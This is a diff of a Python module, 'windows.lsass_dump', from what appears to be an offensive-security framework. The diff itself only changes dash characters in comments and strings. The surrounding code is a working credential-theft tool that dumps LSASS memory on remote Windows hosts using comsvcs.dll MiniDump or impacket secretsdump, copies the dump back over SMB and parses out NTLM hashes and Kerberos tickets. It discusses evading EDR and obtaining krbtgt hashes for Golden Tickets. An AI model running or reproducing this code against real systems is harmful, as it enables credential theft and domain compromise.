@@ -1,21 +1,21 @@
 """
-LSASS Memory Credential Extraction — windows.lsass_dump
-MITRE: T1003.001 — OS Credential Dumping: LSASS Memory
+LSASS Memory Credential Extraction - windows.lsass_dump
+MITRE: T1003.001 - OS Credential Dumping: LSASS Memory
 
 Extracts NTLM hashes and Kerberos tickets from LSASS process memory via
 remote execution through an established session (psexec/wmiexec/winrm).
 
 Three techniques ordered from stealthiest to noisiest:
-  1. COMSVCS.DLL MiniDump (default) — rundll32.exe comsvcs.dll, does not
+  1. COMSVCS.DLL MiniDump (default) - rundll32.exe comsvcs.dll, does not
      match most EDR signatures for LSASS access. Requires SYSTEM.
-  2. Task Manager method — via procdump.exe if available on target.
+  2. Task Manager method - via procdump.exe if available on target.
   3. Direct via impacket secretsdump (DA required, no touch disk).
 
 Dump parsed locally with pypykatz (Python mimikatz port).
 All credentials encrypted into CredentialVault.
 Dump file secure-deleted after parsing.
 
-OPSEC: HIGH — EDR monitors OpenProcess to LSASS (Sysmon Event ID 10).
+OPSEC: HIGH - EDR monitors OpenProcess to LSASS (Sysmon Event ID 10).
        Blocked in STEALTH profile. Requires local SYSTEM or admin.
 """
 from __future__ import annotations
@@ -55,7 +55,7 @@ logger = get_logger("ares.modules.windows.lsass_dump")
 )
 class LsassDumpModule(BaseModule):
     """
-    windows.lsass_dump — Extract NTLM hashes + Kerberos tickets from LSASS via COMSVCS.DLL MiniDump. Remote execution via
+    windows.lsass_dump - Extract NTLM hashes + Kerberos tickets from LSASS via COMSVCS.DLL MiniDump. Remote execution via
 
     OPSEC: HIGH_NOISE
     MITRE: "T1003.001"
@@ -124,7 +124,7 @@ class LsassDumpModule(BaseModule):
                 # 1. Check Credential Guard (VBS/LsaIso.exe)
                 if host_state.has_defense("credential_guard") or host_state.has_defense("vbs"):
                     blockers.append(
-                        "Credential Guard (LsaIso.exe) active: LSASS memory isolated via VBS — "
+                        "Credential Guard (LsaIso.exe) active: LSASS memory isolated via VBS - "
                         "NTLM hashes and Kerberos keys cannot be extracted from userland memory"
                     )
                     score = min(score, 0.05)
@@ -178,7 +178,7 @@ class LsassDumpModule(BaseModule):
         noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
         if noise == NoiseProfile.STEALTH:
             raise ModuleValidationError(
-                "windows.lsass_dump is blocked in STEALTH profile — "
+                "windows.lsass_dump is blocked in STEALTH profile - "
                 "LSASS access triggers Sysmon Event ID 10 and is monitored by all EDR. "
                 "Use NORMAL or AGGRESSIVE profile.",
                 module_id=self.MODULE_ID, field="noise_profile",
@@ -195,7 +195,7 @@ class LsassDumpModule(BaseModule):
         target = getattr(ctx, "target", "") or (ctx.params.get("target", "") if isinstance(ctx.params, dict) else getattr(ctx.params, "target", ""))
         if not target:
             raise ModuleValidationError(
-                "windows.lsass_dump requires 'target' — IP of target Windows host.",
+                "windows.lsass_dump requires 'target' - IP of target Windows host.",
                 module_id=self.MODULE_ID, field="target",
             )
         username = (ctx.params.get("username", "") if isinstance(ctx.params, dict) else getattr(ctx.params, "username", ""))
@@ -337,20 +337,20 @@ class LsassDumpModule(BaseModule):
                   technique: str = "comsvcs", **kwargs: Any):
         await self.before_request(target, "default")
         logger.warning("lsass_dump_start", target=target, technique=technique,
-                       msg="HIGH_NOISE — EDR_ALERT_LIKELY")
+                       msg="HIGH_NOISE - EDR_ALERT_LIKELY")
         audit("lsass_dump", actor=username, technique="T1003.001",
               source="operator", target=target, detail=f"technique={technique}")
 
         loop = asyncio.get_running_loop()
 
         if technique == "secretsdump":
-            # Direct via impacket — no touch disk, requires DA
+            # Direct via impacket - no touch disk, requires DA
             hashes = await loop.run_in_executor(
                 None,
                 lambda: self._secretsdump_sync(target, username, password, domain, lmhash, nthash),
             )
         else:
-            # COMSVCS.DLL MiniDump — stealthiest, requires SYSTEM
+            # COMSVCS.DLL MiniDump - stealthiest, requires SYSTEM
             hashes = await loop.run_in_executor(
                 None,
                 lambda: self._comsvcs_dump_sync(target, username, password, domain, lmhash, nthash),
@@ -364,7 +364,7 @@ class LsassDumpModule(BaseModule):
                 title       = f"LSASS Dump: {len(hashes)} Credentials from {target}",
                 description = (
                     f"Extracted {len(hashes)} NTLM hash(es) from LSASS on {target}. "
-                    + ("krbtgt hash obtained — Golden Ticket possible. " if krbtgt else "")
+                    + ("krbtgt hash obtained - Golden Ticket possible. " if krbtgt else "")
                     + "All credentials stored in vault for immediate reuse."
                 ),
                 severity    = Severity.CRITICAL,
@@ -402,7 +402,7 @@ class LsassDumpModule(BaseModule):
 
     def _secretsdump_sync(self, target: str, username: str, password: str,
                            domain: str, lmhash: str, nthash: str) -> list[dict]:
-        """Direct secretsdump via impacket — no touch disk, DA required."""
+        """Direct secretsdump via impacket - no touch disk, DA required."""
         from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
         from impacket.smbconnection import SMBConnection
 
@@ -488,7 +488,7 @@ class LsassDumpModule(BaseModule):
 
         # Step 3: Transfer dump via SMB
         import time as _time
-        # Poll for dump file instead of fixed sleep — faster on quick targets, safer on slow ones
+        # Poll for dump file instead of fixed sleep - faster on quick targets, safer on slow ones
         _poll_start = _time.monotonic()
         _poll_timeout = 30   # max seconds to wait for dump file to appear
         while _time.monotonic() - _poll_start < _poll_timeout:
@@ -501,7 +501,7 @@ class LsassDumpModule(BaseModule):
             _time.sleep(1)
         from ares.core.security import secure_mkstemp
         local_dump, _fd = secure_mkstemp(suffix=".dmp", prefix="ares_lsass_")
-        import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd — close immediately, file will be written via SMB
+        import os as _os_tmp; _os_tmp.close(_fd)  # mkstemp opens fd - close immediately, file will be written via SMB
 
         try:
             with open(local_dump, "wb") as f:
